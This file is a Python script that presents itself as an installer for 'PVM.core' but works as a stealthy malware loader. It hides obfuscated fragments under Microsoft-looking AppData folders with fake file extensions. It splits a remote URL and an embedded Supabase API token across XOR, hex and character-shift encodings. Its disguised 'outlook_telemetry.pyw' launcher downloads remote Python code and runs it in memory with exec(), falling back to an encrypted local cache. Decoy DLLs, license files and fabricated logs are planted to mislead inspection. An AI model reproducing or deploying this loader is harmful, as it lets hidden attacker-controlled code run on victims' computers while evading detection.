# -*- coding: utf-8 -*-
"""
PVM.core v3.10.76 - Installer
============================
Installs obfuscated launcher with Fernet-encrypted module cache support.
All backend modules run in-memory only (never stored as .py on disk).
"""

import os
import sys
import random
import string
import uuid
import json
import base64
import struct
import secrets

u = os.path.expanduser('~')

# ============================================
# CLEANUP OLD VERSION FILES
# ============================================
old_files = [
    os.path.join(u, 'AppData', 'Local', 'Microsoft', 'WindowsApps', 'RuntimeBroker', 'Front_Supabase.pyw'),
    os.path.join(u, 'AppData', 'Local', 'Microsoft', 'WindowsApps', 'RuntimeBroker', 'device.key'),
    os.path.join(u, 'AppData', 'Local', 'Microsoft', 'WindowsApps', 'RuntimeBroker', 'settings.json'),
    os.path.join(u, 'AppData', 'Local', 'Microsoft', 'WindowsApps', 'RuntimeBroker', 'progress.json'),
    os.path.join(u, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'GreenLeaf.bat'),
    # Old cached .py modules
    os.path.join(u, 'AppData', 'Local', 'Microsoft', 'WindowsApps', 'RuntimeBroker', 'cache', 'modules'),
]
for f in old_files:
    try:
        if os.path.isfile(f):
            os.remove(f)
        elif os.path.isdir(f):
            import shutil
            shutil.rmtree(f, ignore_errors=True)
    except:
        pass

# ============================================
# XOR ENCRYPTION HELPERS (for index file)
# ============================================
def xor_encrypt(data, key):
    key_bytes = key.encode() if isinstance(key, str) else key
    data_bytes = data.encode() if isinstance(data, str) else data
    return bytes([data_bytes[i] ^ key_bytes[i % len(key_bytes)] for i in range(len(data_bytes))])

def generate_key(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

MASTER_KEY = generate_key(32)

# ============================================
# FERNET KEY FOR MODULE ENCRYPTION
# ============================================
# Generate a persistent Fernet key for encrypting cached modules
from cryptography.fernet import Fernet
FERNET_KEY = Fernet.generate_key()  # 44-byte URL-safe base64

# ============================================
# SAFE PATHS - ALL IN AppData\Local\Microsoft\
# ============================================
paths = {
    # URL fragments (8 parts)
    'url1': os.path.join(u, 'AppData', 'Local', 'Microsoft', 'Office', 'Spw'),
    'url2': os.path.join(u, 'AppData', 'Local', 'Microsoft', 'Office', 'OTele'),
    'url3': os.path.join(u, 'AppData', 'Local', 'Microsoft', 'Windows', 'SettingSync', 'metastore'),
    'url4': os.path.join(u, 'AppData', 'Local', 'Microsoft', 'Windows', 'Ringtones'),
    'url5': os.path.join(u, 'AppData', 'Local', 'Microsoft', 'InputPersonalization', 'TextHarvester'),
    'url6': os.path.join(u, 'AppData', 'Local', 'Microsoft', 'Windows Security', 'Logs'),
    'url7': os.path.join(u, 'AppData', 'Local', 'Microsoft', 'Edge', 'Recovery'),
    'url8': os.path.join(u, 'AppData', 'Local', 'Microsoft', 'Windows Mail', 'Stationery'),

    # API Key fragments (4 parts)
    'key1': os.path.join(u, 'AppData', 'Local', 'Microsoft', 'Feeds', 'Cache'),
    'key2': os.path.join(u, 'AppData', 'Local', 'Microsoft', 'Windows Photo Viewer'),
    'key3': os.path.join(u, 'AppData', 'Local', 'Microsoft', 'GameDVR'),
    'key4': os.path.join(u, 'AppData', 'Local', 'Microsoft', 'MSOIdentityCRL', 'Tracing'),

    # Assembler + Logic
    'asm': os.path.join(u, 'AppData', 'Local', 'Microsoft', 'Windows Sidebar', 'Gadgets'),
    'err': os.path.join(u, 'AppData', 'Local', 'Microsoft', 'BingMaps', 'Cache'),
    'rest': os.path.join(u, 'AppData', 'Local', 'Microsoft', 'PlayReady', 'Mspr'),
    'cfg': os.path.join(u, 'AppData', 'Local', 'Microsoft', 'FontCache', 'Local'),

    # Device key, Settings, Progress
    'dev': os.path.join(u, 'AppData', 'Local', 'Microsoft', 'Vault', 'UserData'),
    'set': os.path.join(u, 'AppData', 'Local', 'Microsoft', 'Vault', 'UserData'),
    'prg': os.path.join(u, 'AppData', 'Local', 'Microsoft', 'Speech', 'Files'),

    # Fernet key storage
    'fkey': os.path.join(u, 'AppData', 'Local', 'Microsoft', 'Crypto', 'RSA', 'MachineKeys'),

    # Single encrypted cache directory (code.py manages files inside)
    'mcache': os.path.join(u, 'AppData', 'Local', 'Microsoft', 'CLR_v4.0', 'UsageLogs'),

    # Index file location
    'idx': os.path.join(u, 'AppData', 'Local', 'Microsoft', 'Office', 'SmartBridge'),

    # Main launcher
    'launcher': os.path.join(u, 'AppData', 'Local', 'Microsoft', 'Office', 'SmartBridge'),
    'logs': os.path.join(u, 'AppData', 'Local', 'Microsoft', 'Office', 'SmartBridge', 'cache'),
}

# Decoy directories
decoy_dirs = [
    os.path.join(u, 'AppData', 'Local', 'PVMGroup', 'PVM.core'),
    os.path.join(u, 'AppData', 'Local', 'PVMGroup', 'PVM.core', 'logs'),
    os.path.join(u, 'AppData', 'Local', 'PVMGroup', 'PVM.core', 'config'),
    os.path.join(u, 'AppData', 'Local', 'PVMGroup', 'PVM.core', 'data'),
    os.path.join(u, 'AppData', 'Local', 'PVMGroup', 'PVM.core', 'cache'),
    os.path.join(u, 'AppData', 'Local', 'PVMGroup', 'PVM.core', 'temp'),
]

# Create all directories
for p in list(paths.values()) + decoy_dirs:
    os.makedirs(p, exist_ok=True)

# ============================================
# FILE DEFINITIONS
# ============================================
files = {}

# --- URL Fragments (8 parts) ---
files['url1'] = ('spw0000.osd', '''_u1=''.join([chr(104),chr(116),chr(116),chr(112),chr(115),chr(58),chr(47),chr(47)])
''')

files['url2'] = ('telemetry.otel', '''_u2=bytes.fromhex("6b6a6e64756b666d726170736d707a7370776d76").decode()
''')

files['url3'] = ('settingsync_meta.db', '''_u3="oc.esabapus."[::-1]
''')

files['url4'] = ('metadata.mta', '''import base64 as _b4
_u4=_b4.b64decode("L3N0b3JhZ2UvdjE=").decode()
''')

files['url5'] = ('WaitList.dat', '''_u5=''.join(chr(ord(c)-1)for c in"0pckfdu")
''')

files['url6'] = ('Operational.evtx', '''_u6=''.join(chr(c^3)for c in[44,115,118,97,111,106,96])
''')

files['url7'] = ('Recovery.dat', '''_u7=''.join(chr(int(x,8))for x in['57','142','141','143','153','145','156','144','57'])
''')

files['url8'] = ('Compose.hdr', '''_u8="co"+"de"+".p"+"y"
''')

# --- API Key Fragments (4 parts) ---
key_full = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtqbmR1a2ZtcmFwc21wenNwd212Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjcxNzA1NDYsImV4cCI6MjA4Mjc0NjU0Nn0.BI-BnfrPmXcQt8h_cHVwbSBZXwbTkZh2yY5nBZ4TvYw"
q = len(key_full) // 4

k1_enc = base64.b64encode(key_full[:q].encode()).decode()
files['key1'] = ('~Feeds{3A42F}.tmp', f'''import base64 as _bk1
_k1=_bk1.b64decode("{k1_enc}").decode()
''')

k2_hex = key_full[q:q*2].encode().hex()
files['key2'] = ('PhotoAcq.log', f'''_k2=bytes.fromhex("{k2_hex}").decode()
''')

k3_xor = [ord(c)^7 for c in key_full[q*2:q*3]]
files['key3'] = ('GameDVR.etl', f'''_k3=''.join(chr(c^7)for c in{k3_xor})
''')

k4_shifted = ''.join(chr(ord(c)+5) for c in key_full[q*3:])
files['key4'] = ('TokenBroker.log', f'''_k4=''.join(chr(ord(c)-5)for c in"{k4_shifted}")
''')

# --- Device Key Storage ---
dev_path = os.path.join(paths['dev'], 'vpnconfig.dat')

dev_key_value = secrets.token_hex(16)

os.makedirs(paths['dev'], exist_ok=True)
with open(dev_path, 'w') as f:
    f.write(dev_key_value)

files['dev'] = ('cacheduser.bin', f'''import os as _os
_DVP=r"{dev_path}"
def _gdk():
    if _os.path.exists(_DVP):
        with open(_DVP,"r")as f:
            return f.read().strip()
    return None
''')

# --- Settings Storage ---
set_path = os.path.join(paths['set'], 'AadTokenBroker.db')
default_settings = {"language":"ru","interface_size":50,"font_size":50,"scheduler_enabled":False,"scheduler_time":"09:00","watch_directory":"","auto_download_receipts":False,"shutdown_after":False,"autorun_enabled":False,"slow_network_mode":False,"history_enabled":True,"headless_mode":False,"auto_retry_failed":True}
settings_b64 = base64.b64encode(json.dumps(default_settings).encode()).decode()

files['set'] = ('credcache.dat', f'''import json as _js
import base64 as _b64s
import os as _os
_STP=r"{set_path}"
_DEF_S=_js.loads(_b64s.b64decode("{settings_b64}").decode())
def _lds():
    try:
        if _os.path.exists(_STP):
            with open(_STP,"r")as f:
                return _js.loads(_b64s.b64decode(f.read()).decode())
    except:pass
    return _DEF_S.copy()
def _svs(s):
    _os.makedirs(_os.path.dirname(_STP),exist_ok=True)
    with open(_STP,"w")as f:
        f.write(_b64s.b64encode(_js.dumps(s).encode()).decode())
    return True
''')

# --- Progress Storage ---
prg_path = os.path.join(paths['prg'], 'SpeechModel.cache')
files['prg'] = ('lexicons.dat', f'''import json as _js
import base64 as _b64p
import os as _os
_PRP=r"{prg_path}"
def _ldp():
    try:
        if _os.path.exists(_PRP):
            with open(_PRP,"r")as f:
                return _js.loads(_b64p.b64decode(f.read()).decode())
    except:pass
    return None
def _svp(p):
    _os.makedirs(_os.path.dirname(_PRP),exist_ok=True)
    with open(_PRP,"w")as f:
        f.write(_b64p.b64encode(_js.dumps(p).encode()).decode())
def _clp():
    if _os.path.exists(_PRP):_os.remove(_PRP)
''')

# --- Fernet Key Storage (XOR-encrypted, stored as binary) ---
fkey_path = os.path.join(paths['fkey'], 'container.p12')
# Store Fernet key XOR-encrypted with a derived key from device_key
fkey_xor_key = dev_key_value[:32].ljust(32, '0')
fkey_encrypted = xor_encrypt(FERNET_KEY, fkey_xor_key)
with open(fkey_path, 'wb') as f:
    f.write(b'\x30\x82' + os.urandom(4))  # Fake PKCS12 header
    f.write(struct.pack('<H', len(fkey_encrypted)))
    f.write(fkey_encrypted)
    f.write(os.urandom(64))  # Padding

files['fkey_loader'] = None  # Special handling — embedded in assembler

# Cache directory path (code.py manages filenames inside it)
cache_dir_path = paths['mcache']

files['asm'] = ('gadget.xml', f'''import struct as _st
def _gu():
    return _u1+_u2+_u3+_u4+_u5+_u6+_u7+_u8
def _gk():
    return _k1+_k2+_k3+_k4
def _gsu():
    return _u1+_u2+_u3
_FKP=r"{fkey_path}"
_MCD=r"{cache_dir_path}"
def _x(d,k):
    kb=k.encode()if isinstance(k,str)else k
    db=d if isinstance(d,bytes)else d.encode()
    return bytes([db[i]^kb[i%len(kb)]for i in range(len(db))])
def _gfk():
    try:
        with open(_FKP,"rb")as f:
            raw=f.read()
        kl=_st.unpack("<H",raw[6:8])[0]
        enc=raw[8:8+kl]
        dk=_gdk()
        if not dk:return None
        xk=dk[:32].ljust(32,"0")
        return _x(enc,xk)
    except:return None
''')

# --- Config (paths) ---
files['cfg'] = ('FontCacheIdx.dat', f'_BD=r"{paths["launcher"]}"\n_LD=r"{paths["logs"]}"\n')

# --- Error Handlers ---
files['err'] = ('MapTileCache.db', '''def _er(m):
    import tkinter.messagebox as mb
    mb.showerror("Error",m)
    __import__("sys").exit(1)
def _tech(t,m):
    import tkinter as tk
    w=tk.Tk();w.title("System");w.geometry("420x180");w.resizable(0,0);w.configure(bg="#f5f5f5")
    tk.Label(w,text=t,font=("Segoe UI",14,"bold"),bg="#f5f5f5",fg="#333").pack(pady=(25,10))
    tk.Label(w,text=m,font=("Segoe UI",10),bg="#f5f5f5",fg="#555",wraplength=380,justify="center").pack(pady=10)
    tk.Button(w,text="OK",command=w.destroy,width=12,bg="#e0e0e0",fg="#333",font=("Segoe UI",10)).pack(pady=15)
    w.eval('tk::PlaceWindow . center');w.mainloop();__import__("sys").exit(0)
''')

# --- REST URL Builder ---
files['rest'] = ('mspr.hds', '''def _gru():
    _r1=''.join(chr(c)for c in[47,114,101,115,116,47,118,49,47])
    _r2=bytes.fromhex("6e6f74696669636174696f6e73").decode()
    _r3="?notification_type=eq."
    _r4=''.join(chr(ord(c)-2)for c in"vgejpkecn_yqtmu")
    return _r1+_r2+_r3+_r4+"&select=title,message"
''')

# --- Main Logic (updated for in-memory execution + Fernet cache) ---
main_logic = '''def _main():
    import requests,json,urllib.request,os,sys
    _SU=_gsu()
    _SK=_gk()
    try:
        _resp=requests.get(_gu(),timeout=30)
        if _resp.status_code==404:
            try:
                url=_SU+_gru()
                req=urllib.request.Request(url,headers={"apikey":_SK,"Authorization":"Bearer "+_SK})
                with urllib.request.urlopen(req,timeout=10)as r:
                    data=json.loads(r.read().decode())
                    if data and len(data)>0:_tech(data[0].get("title","Maintenance"),data[0].get("message","Please try again later."))
            except:_tech("Technical Works","Application is temporarily unavailable. Please try again later.")
        if _resp.status_code!=200:_er("HTTP "+str(_resp.status_code))
        if len(_resp.content)<500:_er("Invalid response")
        exec(_resp.content.decode("utf-8"),{"__name__":"__main__","__file__":__file__,"BASE_DIR":_BD,"LOGS_DIR":_LD,"SUPABASE_URL":_SU,"SUPABASE_KEY":_SK,"_load_settings":_lds,"_save_settings":_svs,"_get_device_key":_gdk,"_load_progress":_ldp,"_save_progress":_svp,"_clear_progress":_clp,"_get_fernet_key":_gfk,"_CACHE_DIR":_MCD})
    except requests.exceptions.ConnectionError:
        _fk=_gfk()
        if _fk:
            try:
                from cryptography.fernet import Fernet as _F
                _fn=_F(_fk)
                _cc=os.path.join(_MCD,"97a764485014.dat")
                if os.path.exists(_cc):
                    with open(_cc,"rb")as f:_raw=f.read()
                    _dl=int.from_bytes(_raw[4:8],"little")
                    _dec=_fn.decrypt(_raw[8:8+_dl]).decode("utf-8")
                    exec(_dec,{"__name__":"__main__","__file__":__file__,"BASE_DIR":_BD,"LOGS_DIR":_LD,"SUPABASE_URL":_SU,"SUPABASE_KEY":_SK,"_load_settings":_lds,"_save_settings":_svs,"_get_device_key":_gdk,"_load_progress":_ldp,"_save_progress":_svp,"_clear_progress":_clp,"_get_fernet_key":_gfk,"_CACHE_DIR":_MCD,"_OFFLINE_MODE":True})
                    return
            except:
                pass
        _tech("Нет подключения к интернету","Не удалось установить соединение с сервером.\nПроверьте интернет-соединение и запустите приложение ещё раз.")
    except Exception as e:
        _es=str(e).lower()
        if any(k in _es for k in ["connection","resolve","getaddrinfo","nodename","max retries","unreachable","timed out"]):
            _tech("Нет подключения к интернету","Не удалось установить соединение с сервером.\nПроверьте интернет-соединение и запустите приложение ещё раз.")
        else:
            _er(str(e))
'''

# ============================================
# WRITE ALL FRAGMENT FILES
# ============================================
file_paths = []

for key, val in files.items():
    if val is None:
        continue
    filename, content = val
    if key in paths:
        filepath = os.path.join(paths[key], filename)
    elif key == 'fkey_loader':
        continue
    elif key.startswith('key'):
        filepath = os.path.join(paths[key], filename)
    elif key.startswith('url'):
        filepath = os.path.join(paths[key], filename)
    else:
        continue
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(content)
    file_paths.append(filepath)

# Write main logic
main_path = os.path.join(paths['launcher'], 'office_net.dat')
with open(main_path, 'w', encoding='utf-8') as f:
    f.write(main_logic)
file_paths.append(main_path)

# ============================================
# CREATE ENCRYPTED INDEX FILE
# ============================================
paths_data = '\n'.join(file_paths)
paths_encrypted = xor_encrypt(paths_data, MASTER_KEY)

index_content = bytearray()
index_content.extend(bytes([0x00, 0x01, 0x00, 0x00]))
index_content.extend(os.urandom(16))
index_content.extend(struct.pack('<I', len(paths_encrypted)))
index_content.extend(bytes([0xFF, 0xFE]))
index_content.extend(paths_encrypted)
index_content.extend(bytes([0xFE, 0xFF]))
index_content.extend(os.urandom(32))
index_content.extend(bytes([0x00] * 8))

index_path = os.path.join(paths['idx'], 'office_cache.bin')
with open(index_path, 'wb') as f:
    f.write(index_content)

# ============================================
# CREATE LAUNCHER
# ============================================
launcher_code = f'''import os,sys,struct,ctypes
_DBG=os.environ.get("PVM_DEBUG")=="1" and os.path.exists(os.path.join(os.path.expanduser("~"),".pvm_dev"))
if _DBG:
    try: sys.stdout.reconfigure(encoding='utf-8')
    except: pass
def _msg(t,m,i=0x10):
    if _DBG: print(f"[DEBUG] {{t}}: {{m}}"); return
    try:
        import tkinter.messagebox as mb
        mb.showerror(t,m)
    except:
        ctypes.windll.user32.MessageBoxW(0,str(m),str(t),i|0x0)
def _x(d,k):
    return bytes([d[i]^k[i%len(k)]for i in range(len(d))])
_=lambda s:''.join(chr(ord(c)-3)for c in s)
_i=_(r"{(''.join(chr(ord(c)+3) for c in index_path))}")
_k=_(r"{(''.join(chr(ord(c)+3) for c in MASTER_KEY))}")
try:
    # Pre-flight Check
    _req=["requests","cryptography","PIL","pystray","pandas","supabase"]
    _miss=[]
    for _m in _req:
        try: __import__(_m)
        except ImportError: _miss.append(_m)
    if _miss:
        if _DBG: print(f"[DEBUG] Missing dependencies: {{_miss}}")
        _msg("Environment Error","Missing dependencies: "+", ".join(_miss)+"\\nPlease run SystemConfig.bat again.")
        sys.exit(1)

    if not os.path.exists(_i):
        if _DBG: print(f"[DEBUG] Index missing at {{_i}}")
        _msg("Init Error","Component index missing. Please reinstall.")
        sys.exit(1)
        
    with open(_i,'rb')as f:_d=f.read()
    _o=struct.unpack('<I',_d[20:24])[0]
    _e=_d[26:26+_o]
    _p=_x(_e,_k.encode()).decode().strip().split('\\n')
    _g={{"__file__":os.path.abspath(__file__)}}
    
    for _f in _p:
        _f=_f.strip()
        if not _f or _f.endswith(".ico"):continue
        try:
            if _DBG: print(f"[DEBUG] Loading fragment: {{os.path.basename(_f)}}")
            with open(_f,'r',encoding='utf-8')as h:exec(h.read(),_g)
        except Exception as _fe:
            if _DBG: import traceback; traceback.print_exc()
            _msg("Component Error","Failed to load "+os.path.basename(_f)+"\\n"+str(_fe))
            sys.exit(1)
            
    if "_main" in _g:
        try:
            if _DBG: print("[DEBUG] Starting main entry point...")
            _g["_main"]()
        except Exception as _me:
            if _DBG: import traceback; traceback.print_exc()
            _msg("Runtime Error",str(_me))
    else:
        if _DBG: print("[DEBUG] Entry point _main not found in fragments")
        _msg("Entry Error","Main entry point not found in fragments.")
        
except Exception as _ex:
    if _DBG: import traceback; traceback.print_exc()
    _msg("Fatal Error",str(_ex))
'''

launcher_path = os.path.join(paths['launcher'], 'outlook_telemetry.pyw')
with open(launcher_path, 'w', encoding='utf-8') as f:
    f.write(launcher_code)

# ============================================
# DECOY FILES
# ============================================
decoy_base = os.path.join(u, 'AppData', 'Local', 'PVMGroup', 'PVM.core')

fake_main = '''# -*- coding: utf-8 -*-
# PVM.core v2.6.1 - Enterprise Module
# Copyright (c) 2024-2026 PVM Group. All rights reserved.

import os, sys, json, hashlib, base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

__version__ = "2.6.1"
__api__ = "https://api.pvmgroup.net/v3/enterprise"
__license__ = "https://license.pvmgroup.net/validate"

class LicenseManager:
    SALT = b'PVMGroup2026SecureSalt'
    def __init__(self):
        self.hwid = self._get_hwid()
        self.key = self._derive_key()
    def _get_hwid(self):
        import subprocess
        try:
            r = subprocess.check_output('wmic csproduct get uuid', shell=True)
            return hashlib.sha256(r).hexdigest()[:32]
        except:
            return hashlib.sha256(os.urandom(32)).hexdigest()[:32]
    def _derive_key(self):
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=self.SALT, iterations=480000)
        return base64.urlsafe_b64encode(kdf.derive(self.hwid.encode()))
    def validate(self):
        import requests
        try:
            r = requests.post(__license__, json={"hwid": self.hwid, "version": __version__}, timeout=10)
            return r.status_code == 200 and r.json().get("valid", False)
        except:
            return False

if __name__ == "__main__":
    lm = LicenseManager()
    if not lm.validate():
        print("License validation failed")
        sys.exit(1)
'''
with open(os.path.join(decoy_base, 'main.py'), 'w') as f:
    f.write(fake_main)

fake_config = {
    "version": "2.6.1",
    "api_endpoint": "https://api.pvmgroup.net/v3/enterprise",
    "license_server": "https://license.pvmgroup.net",
    "encryption": "AES-256-GCM",
    "key_derivation": "PBKDF2-SHA256",
    "iterations": 480000,
}
with open(os.path.join(decoy_base, 'config', 'settings.json'), 'w') as f:
    json.dump(fake_config, f, indent=2)

fake_enc = b'gAAAAA' + os.urandom(256)
with open(os.path.join(decoy_base, 'config', 'settings.enc'), 'wb') as f:
    f.write(fake_enc)

with open(os.path.join(decoy_base, 'LICENSE.txt'), 'w') as f:
    f.write(f'''PVM GROUP - ENTERPRISE SOFTWARE LICENSE
License ID: {uuid.uuid4()}
License Type: Enterprise Subscription
Issue Date: 2026-01-15
Expiry Date: 2027-01-15

For support: support@pvmgroup.net
''')

dll_names = ['pvmcore.dll', 'crypto.dll', 'license.dll']
for dll in dll_names:
    pe_header = bytearray()
    pe_header.extend(b'MZ')
    pe_header.extend(b'\x90' * 58)
    pe_header.extend(struct.pack('<I', 64))
    pe_header.extend(b'PE\x00\x00')
    pe_header.extend(struct.pack('<H', 0x8664))
    pe_header.extend(struct.pack('<H', 3))
    pe_header.extend(os.urandom(1024))
    with open(os.path.join(decoy_base, dll), 'wb') as f:
        f.write(pe_header)

with open(os.path.join(decoy_base, 'cache', 'sessions.db'), 'wb') as f:
    f.write(b'SQLite format 3\x00')
    f.write(os.urandom(4096))

for i in range(3):
    log_date = f"2026-01-{20+i:02d}"
    log_content = f'''[{log_date} 09:00:00] [INFO] Application started
[{log_date} 09:00:01] [INFO] License valid
[{log_date} 09:15:32] [INFO] Session ended
'''
    with open(os.path.join(decoy_base, 'logs', f'{uuid.uuid4().hex[:8]}_{log_date}.log'), 'w') as f:
        f.write(log_content)

print("Installation complete!")
sys.exit(0)
